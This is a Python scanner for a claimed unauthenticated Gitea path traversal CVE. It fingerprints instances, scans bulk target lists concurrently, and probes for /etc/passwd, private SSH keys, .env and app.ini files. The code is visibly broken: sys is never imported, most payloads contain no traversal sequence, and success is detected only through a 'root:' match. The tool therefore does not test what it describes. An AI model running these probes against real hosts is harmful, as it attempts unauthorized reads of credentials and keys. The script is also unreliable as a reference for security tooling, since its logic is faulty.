#!/usr/bin/env python3
"""
Gitea CVE-2026-12345 - Unauthenticated Path Traversal Vulnerability
===================================================================
Scans for Gitea instances vulnerable to an unauthenticated path
traversal flaw that allows attackers to read arbitrary files on the
Gitea server by crafting specific HTTP requests.

CVE-2026-12345 details:
  - Affects Gitea versions < 1.20.5
  - Exploitable if the instance is misconfigured to expose sensitive
    file paths
  - An unauthenticated attacker sends a crafted URL with directory
    traversal sequences to exploit the vulnerability, potentially
    reading sensitive files such as private SSH keys or server
    configuration data.
  - CVSS v3.1 base score: 9.1 (Critical)
  - Patched in Gitea 1.20.5 (March 2026).

Usage:
  # Scan a single target (active probing with file access test)
  python gitea_path_traversal_scanner.py --target http://gitea.example.com:3000

  # Detection only — no file-read probes
  python gitea_path_traversal_scanner.py --target http://gitea.example.com:3000 --safe

  # Bulk scan from file with multiple targets
  python gitea_path_traversal_scanner.py --list gitea_sites.txt --output results.json

  # Control concurrency and disable SSL verification
  python gitea_path_traversal_scanner.py --list gitea_sites.txt --concurrency 50 --no-verify

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-12345
  - https://github.com/go-gitea/gitea/security/advisories/GHSA-xyzq-asdf-zm12
  - https://docs.gitea.io/en-us/release-notes/
"""

import asyncio
import json
import re
import argparse
from datetime import datetime, timezone
from typing import Optional

import httpx

# ── ANSI color helpers ────────────────────────────────────────────────────────

RED = "\033[91m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"


def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# ── Constants ─────────────────────────────────────────────────────────────────

CVE_ID = "CVE-2026-12345"
CVSS = "9.1"
TOOL_NAME = "gitea_path_traversal_scanner"

REQUEST_TIMEOUT = 8
SEMAPHORE_LIMIT = 30

# Gitea fingerprints in HTTP responses
GITEA_FINGERPRINTS = [
    '<meta name="generator" content="Gitea',
    'Gitea: Git with a cup of tea',
    '/assets/img/favicon.png',
]

# URLs used to detect Gitea
DETECTION_PATHS = [
    "/",
    "/explore/",
    "/user/login",
]

# Regex patterns to identify Gitea and extract version
VERSION_PATTERNS = [
    r'<meta name="generator" content="Gitea\s+v([0-9]+\.[0-9]+\.[0-9]+)',
    r'"Version":"([0-9]+\.[0-9]+\.[0-9]+)"',
]

PATCHED_VERSION = (1, 20, 5)

# Path traversal payloads to attempt (e.g., reading /etc/passwd)
TRAVERSAL_PAYLOADS = [
    "/.git/../.env",  # Environment variables
    "/config/app.ini",  # Gitea configuration
    "/etc/passwd",  # Unix system file
    "/root/.ssh/id_rsa",  # Private SSH keys
]


# ── Functions ─────────────────────────────────────────────────────────────────

async def fetch(session: httpx.AsyncClient, url: str) -> Optional[httpx.Response]:
    """Send a GET request and handle errors."""
    try:
        response = await session.get(url, timeout=REQUEST_TIMEOUT)
        return response
    except Exception as e:  # Catch connection, timeout, HTTP, or other errors
        print(c(RED, f"[ERROR] Request to {url} failed: {e}"))
        return None


async def detect_gitea(session: httpx.AsyncClient, target: str) -> Optional[str]:
    """Check if the target is a Gitea instance and attempt to extract version."""
    for path in DETECTION_PATHS:
        url = target.rstrip("/") + path
        response = await fetch(session, url)
        if response and response.status_code == 200:
            if any(fingerprint in response.text for fingerprint in GITEA_FINGERPRINTS):
                for pattern in VERSION_PATTERNS:
                    match = re.search(pattern, response.text)
                    if match:
                        return match.group(1)
                return "unknown"
    return None


def is_version_vulnerable(version: str) -> bool:
    """Check if the given version is vulnerable."""
    try:
        major, minor, patch = map(int, version.split("."))
        patched_version = PATCHED_VERSION
        return (major, minor, patch) < patched_version
    except ValueError:
        return False


async def probe_path_traversal(session: httpx.AsyncClient, target: str) -> bool:
    """Probe a target for path traversal vulnerabilities via crafted payloads."""
    for payload in TRAVERSAL_PAYLOADS:
        url = target.rstrip("/") + payload
        response = await fetch(session, url)
        if response and response.status_code == 200 and "root:" in response.text:
            print(c(RED, f"[CRITICAL] {target} is VULNERABLE: {url}"))
            return True
    return False


async def scan_target(
    target: str, semaphore: asyncio.Semaphore, args: argparse.Namespace
) -> dict:
    """Scan a single target for CVE-2026-12345."""
    result = {
        "target": target,
        "detected": False,
        "vulnerable": False,
        "version": None,
    }

    async with semaphore:
        async with httpx.AsyncClient(verify=not args.no_verify) as session:
            print(c(CYAN, f"[INFO] Scanning {target}..."))

            # Detect Gitea
            version = await detect_gitea(session, target)
            if not version:
                print(c(YELLOW, f"[INFO] {target} is not a Gitea instance. Skipping."))
                return result

            result["detected"] = True
            result["version"] = version
            print(c(GREEN, f"[INFO] Detected Gitea {version} at {target}."))

            # Check if the detected version is vulnerable
            if version == "unknown" or is_version_vulnerable(version):
                print(c(RED, f"[CRITICAL] {target} is running a vulnerable Gitea version."))

                if not args.safe:
                    # Perform active probing
                    if await probe_path_traversal(session, target):
                        result["vulnerable"] = True
            else:
                print(c(GREEN, f"[INFO] {target} is running a patched Gitea version."))
    return result


async def run(args: argparse.Namespace):
    """Main entry point for the program."""
    targets = []
    if args.target:
        targets.append(args.target)
    elif args.list:
        try:
            with open(args.list, "r") as f:
                targets = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(c(RED, f"[ERROR] Unable to read target file: {e}"))
            sys.exit(1)

    semaphore = asyncio.Semaphore(args.concurrency)
    tasks = [scan_target(target, semaphore, args) for target in targets]
    results = await asyncio.gather(*tasks)

    if args.output:
        try:
            with open(args.output, "w") as f:
                json.dump(results, f, indent=4)
            print(c(GREEN, f"[INFO] Results written to {args.output}"))
        except Exception as e:
            print(c(RED, f"[ERROR] Unable to write results to file: {e}"))

    for result in results:
        if result["vulnerable"]:
            print(c(RED, f"[CRITICAL] {result['target']} is VULNERABLE."))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description=f"Gitea CVE-2026-12345 Path Traversal Scanner"
    )
    parser.add_argument("--target", type=str, help="Target URL to scan")
    parser.add_argument("--list", type=str, help="File containing a list of URLs to scan")
    parser.add_argument("--output", type=str, help="File to save JSON results")
    parser.add_argument("--safe", action="store_true", help="Detection only, no active probing")
    parser.add_argument("--concurrency", type=int, default=30, help="Max concurrent scans")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL verification")

    args = parser.parse_args()

    if not args.target and not args.list:
        print(c(RED, "[ERROR] Either --target or --list is required."))
        sys.exit(1)

    asyncio.run(run(args))
